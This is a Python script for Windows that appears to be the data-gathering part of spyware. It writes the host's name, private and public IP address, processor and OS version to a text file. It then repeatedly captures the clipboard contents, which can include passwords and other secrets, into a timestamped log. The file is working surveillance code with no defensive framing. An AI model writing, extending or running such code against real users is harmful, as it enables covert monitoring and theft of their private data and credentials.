import socket
import platform
from datetime import datetime
import win32clipboard
import threading
from requests import get
import time
import os,sys
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"

def resource_path(relative_path):
    try:
        base_path=sys.abspath(".")
    except Exception:
        base_path=os.path.abspath(".")
    return os.path.join(base_path,relative_path)

def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
computer_information()

def copy_clipboard():
    number_of_iterations_end = int(sys.argv[1])
    number_of_iterations = 0

    def write_timestamp():
        while True:
            time.sleep(15)
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(resource_path(clipboard_information), "a") as f:
                f.write(f'\n[{timestamp}] Timestamp\n')
                
    threading.Thread(target=write_timestamp, daemon=True).start()

    while number_of_iterations < number_of_iterations_end:
        with open(clipboard_information, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Clipboard Data: \n" + pasted_data)
            except:
                f.write("Clipboard could be not be copied")
        number_of_iterations+=1
        time.sleep(25)
copy_clipboard()

